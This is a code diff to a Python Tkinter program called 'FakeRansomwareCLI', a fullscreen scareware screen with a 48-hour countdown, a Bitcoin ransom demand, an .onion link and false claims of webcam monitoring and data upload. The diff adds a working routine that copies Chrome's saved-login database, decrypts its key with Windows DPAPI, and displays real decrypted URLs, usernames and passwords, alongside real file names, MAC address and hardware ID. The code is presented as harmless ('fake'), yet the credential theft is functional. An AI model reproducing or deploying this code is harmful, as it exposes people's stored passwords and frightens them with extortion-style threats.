@@ -3,6 +3,15 @@ import os
 import getpass
 import platform
 import socket
+import uuid
+import subprocess
+import time
+import threading
+import random
+import sqlite3
+import win32crypt  # For decrypting Chrome passwords
+import json
+from base64 import b64decode
 
 class FakeRansomwareCLI:
     def __init__(self, root):
@@ -12,6 +21,10 @@ class FakeRansomwareCLI:
         self.root.attributes("-fullscreen", True)
         self.root.bind("<space>", self.exit_program)
 
+        # Countdown time (48 hours in seconds)
+        self.time_left = 48 * 60 * 60
+
+        # Text widget (main terminal area)
         self.text_widget = tk.Text(
             root,
             bg="black",
@@ -23,59 +36,152 @@ class FakeRansomwareCLI:
             padx=20,
             pady=20
         )
-        self.text_widget.pack(fill="both", expand=True)
+        self.text_widget.pack(side="left", fill="both", expand=True)
         self.text_widget.configure(state="disabled")
 
-        # Gather real (local only) system info for scare factor
+        # Timer (top right)
+        self.timer_label = tk.Label(
+            root,
+            text="",
+            fg="red",
+            bg="black",
+            font=("Consolas", 28, "bold"),
+            anchor="ne",
+            justify="right"
+        )
+        self.timer_label.place(relx=0.99, rely=0.01, anchor="ne")
+
+        # SYSTEM INFO (SAFE: purely local, nothing sent)
         username = getpass.getuser()
         computername = platform.node()
         ip_address = socket.gethostbyname(socket.gethostname())
         os_info = f"{platform.system()} {platform.release()}"
 
-        user_dir_files = []
         try:
-            user_dir = os.path.expanduser("~")
-            sample_files = os.listdir(user_dir)
-            user_dir_files = random.sample(sample_files, min(5, len(sample_files)))
+            mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
+                                for ele in range(0, 8*6, 8)][::-1])
         except:
-            user_dir_files = ["[ERROR] Cannot access directory."]
+            mac_addr = "Unavailable"
 
-        self.lines_to_type = [
-            "[!] SYSTEM BREACH DETECTED...\n",
-            "[*] Device Compromised\n",
-            "[*] Collecting sensitive information...\n",
-            "[*] Locking local data...\n",
-            "\n",
-            f"[INFO] Username: {username}\n",
-            f"[INFO] Computer: {computername}\n",
-            f"[INFO] Local IP: {ip_address}\n",
-            f"[INFO] OS: {os_info}\n",
-            "\n",
-            "[!!!] YOUR FILES HAVE BEEN LOCKED\n",
-            "[!!!] DO NOT POWER OFF OR DISCONNECT\n",
-            "\n",
-            "The following personal files are now inaccessible:\n"
+        try:
+            hwid = subprocess.check_output("wmic csproduct get uuid", shell=True).decode().split('\n')[1].strip()
+        except:
+            hwid = "Unavailable"
+
+        # Get real Chrome passwords
+        def get_chrome_passwords():
+            try:
+                # Path to Chrome's Login Data SQLite database
+                chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
+                if not os.path.exists(chrome_path):
+                    return ["[ERROR] Chrome password database not found"]
+
+                # Copy the database to avoid locking issues
+                temp_path = os.path.join(os.environ["TEMP"], "Login Data")
+                with open(chrome_path, 'rb') as f:
+                    data = f.read()
+                with open(temp_path, 'wb') as f:
+                    f.write(data)
+
+                # Connect to the copied database
+                conn = sqlite3.connect(temp_path)
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                passwords = []
+
+                # Get encryption key (Windows DPAPI)
+                key_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+                with open(key_path, 'r') as f:
+                    local_state = json.load(f)
+                encrypted_key = b64decode(local_state['os_crypt']['encrypted_key'])[5:]  # Remove 'DPAPI' prefix
+                decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+                # Decrypt passwords
+                from Crypto.Cipher import AES
+                for url, user, pwd in cursor.fetchall():
+                    if user and pwd:  # Only include non-empty entries
+                        # Decrypt password
+                        nonce = pwd[:12]
+                        ciphertext = pwd[12:-16]
+                        tag = pwd[-16:]
+                        cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=nonce)
+                        decrypted_pwd = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
+                        passwords.append(f"[LEAKED] {url} : {user} : {decrypted_pwd}")
+                
+                conn.close()
+                os.remove(temp_path)  # Clean up temp file
+                return passwords[:5] if passwords else ["[ERROR] No passwords found"]
+            except Exception as e:
+                return [f"[ERROR] Failed to extract passwords: {str(e)}"]
+
+        chrome_passwords = get_chrome_passwords()
+
+        # Fake sensitive info (other than passwords)
+        fake_sensitive = [
+            f"[LEAKED] SSN Fragment: ***-**-{random.randint(1000,9999)}",
+            f"[LEAKED] Crypto Wallet: 0x{random.randint(100000,999999)}...{random.randint(1000,9999)}",
+            f"[LEAKED] Recent Browser Search: 'secure my account' ({time.strftime('%Y-%m-%d %H:%M:%S')})",
         ]
 
-        self.lines_to_type += [f"  - {f}" for f in user_dir_files]
-        self.lines_to_type += [
+        # Real filenames from user folder with fake "encrypted" extensions
+        user_dir = os.path.expanduser("~")
+        sample_files = []
+        for folder in ["Desktop", "Documents", "Downloads", "Pictures", "Videos"]:
+            path = os.path.join(user_dir, folder)
+            if os.path.isdir(path):
+                try:
+                    files = os.listdir(path)
+                    files = [f for f in files if os.path.isfile(os.path.join(path, f))]
+                    sample_files += random.sample(files, min(3, len(files)))
+                except:
+                    continue
+        if not sample_files:
+            sample_files = ["tax_return_2023.pdf", "passport_scan.jpg", "private_notes.txt"]
+        sample_files = [f"{f}.locked" for f in sample_files]
+
+        # Typing script with Chrome password extraction
+        self.lines_to_type = [
+            "[!] CRITICAL SYSTEM BREACH DETECTED\n",
+            "[*] Establishing remote connection...\n",
+            "[*] Bypassing firewall defenses\n",
+            "[*] Accessing Chrome password database\n",
+            "[*] Decrypting credentials with DPAPI key\n",
+            "[*] Deploying encryption payload v3.7.1\n",
+            "[*] Uploading data to dark web server...\n",
             "\n",
-            "We are monitoring your activity in real-time.\n",
-            "Any attempt to bypass this lock will result in total data destruction.\n",
+            f"[INFO] Username: {username}\n",
+            f"[INFO] Computer Name: {computername}\n",
+            f"[INFO] IP Address: {ip_address}\n",
+            f"[INFO] OS Version: {os_info}\n",
+            f"[INFO] MAC Address: {mac_addr}\n",
+            f"[INFO] HWID: {hwid}\n",
             "\n",
-            "To recover your files, visit the TOR link below:\n",
-            "http://decryptdata.onion/restore?id=AC7DFF91\n",
+            "[!!!] YOUR SYSTEM IS COMPROMISED\n",
+            "All files have been encrypted. Do NOT shut down or data will be wiped.\n",
+            "Webcam and microphone activated. Remote monitoring enabled.\n",
             "\n",
-            "Your unique ID: AC7DFF91\n",
-            "Time left: 47:59:33\n",
+            "Compromised files detected:\n"
+        ] + [f"  - {f}" for f in sample_files] + [
             "\n",
-            "Press SPACEBAR to exit (your system will remain locked)\n"
+            "Extracted Chrome credentials:\n"
+        ] + chrome_passwords + [
+            "\n",
+            "Additional stolen data:\n"
+        ] + fake_sensitive + [
+            "\n",
+            "To recover your files, send 0.5 BTC to: 1X{random.randint(100000,999999)}...{random.randint(1000,9999)}\n",
+            "Instructions at: http://decryptdata.onion/restore?id=AC7DFF91\n",
+            "\n",
+            "Unique ID: AC7DFF91\n",
+            "Time left until data leak:\n",
         ]
 
         self.current_line = 0
         self.current_char = 0
         self.typing_speed_ms = 18
         self.start_typing()
+
+        threading.Thread(target=self.update_timer, daemon=True).start()
 
     def start_typing(self):
         if self.current_line < len(self.lines_to_type):
@@ -95,12 +201,21 @@ class FakeRansomwareCLI:
         self.text_widget.see("end")
         self.text_widget.configure(state="disabled")
 
+    def update_timer(self):
+        while self.time_left >= 0:
+            hrs = self.time_left // 3600
+            mins = (self.time_left % 3600) // 60
+            secs = self.time_left % 60
+            timer_str = f"{hrs:02}:{mins:02}:{secs:02}"
+            self.timer_label.config(text=timer_str)
+            time.sleep(1)
+            self.time_left -= 1
+
     def exit_program(self, event):
         self.root.destroy()
 
 
 if __name__ == "__main__":
-    import random
     root = tk.Tk()
     app = FakeRansomwareCLI(root)
     root.mainloop()
